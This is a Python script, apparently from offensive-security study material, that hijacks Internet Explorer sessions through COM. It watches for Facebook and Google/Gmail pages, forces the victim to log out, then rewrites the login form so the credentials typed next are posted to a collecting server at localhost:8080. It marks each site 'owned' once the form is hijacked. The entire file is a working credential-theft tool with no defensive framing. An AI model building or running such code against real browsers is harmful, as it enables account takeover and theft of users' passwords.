import win32com.client
import time
import urlparse
import urllib

data_receiver = "http://localhost:8080/"

target_sites  = {}
target_sites["m.facebook.com"] = \
    {"logout_url"      : None,
     #"logout_form"     : "logout_form",
     "logout_form"     : "mbasic_logout_button",
     "login_form_index": 0,
     "owned"           : False}

target_sites["accounts.google.com"]    = \
    {"logout_url"       : "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
     "logout_form"      : None,
     "login_form_index" : 0,
     "owned"            : False}

target_sites["www.gmail.com"]   = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]

clsid='{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'

windows = win32com.client.Dispatch(clsid)

def wait_for_browser(browser):

    # wait for the browser to finish loading a page
    while browser.ReadyState != 4 and browser.ReadyState != "complete":    
        time.sleep(0.1)
        print("wait_for_browser")
    return

while True:

    for browser in windows:

        url = urlparse.urlparse(browser.LocationUrl)

        print(url.hostname)
        if url.hostname in target_sites:
            print(url.hostname)
            if target_sites[url.hostname]["owned"]:
                print("Finished one")
                continue

            # if there is an URL we can just redirect
            if target_sites[url.hostname]["logout_url"]:
                print("logout_url have value")
                browser.Navigate(target_sites[url.hostname]["logout_url"])
                wait_for_browser(browser)
            else:
                print("Find full_doc")
                # retrieve all elements in the document
                full_doc = browser.Document.all
                print("full_doc : %s" %full_doc["address"])
                # iterate looking for the logout form
                for i in full_doc:
                    #print("i : %s" %i)

                    try:                        
                        print("i.id: %s ; logout_form: %s" %(i.id, target_sites[url.hostname]["logout_form"]))
                        print(i.id == target_sites[url.hostname]["logout_form"])
                        # find the logout form and submit it
                        if i.id == target_sites[url.hostname]["logout_form"]:
                            print("i.id equal %s\n" %i.id)
                            i.submit()
                            print("\nsubmit ok\n")
                            wait_for_browser(browser)
                            print("logout ok")
                    except:
                        pass

            try:
                # now we modify the login form
                login_index = target_sites[url.hostname]["login_form_index"]
                print("try to login: %s" %(login_index))
                login_page = urllib.quote(browser.LocationUrl)
                print("login_page: %s" %(login_page))
                browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
                target_sites[url.hostname]["owned"] = True 

            except:
                pass


        time.sleep(5)
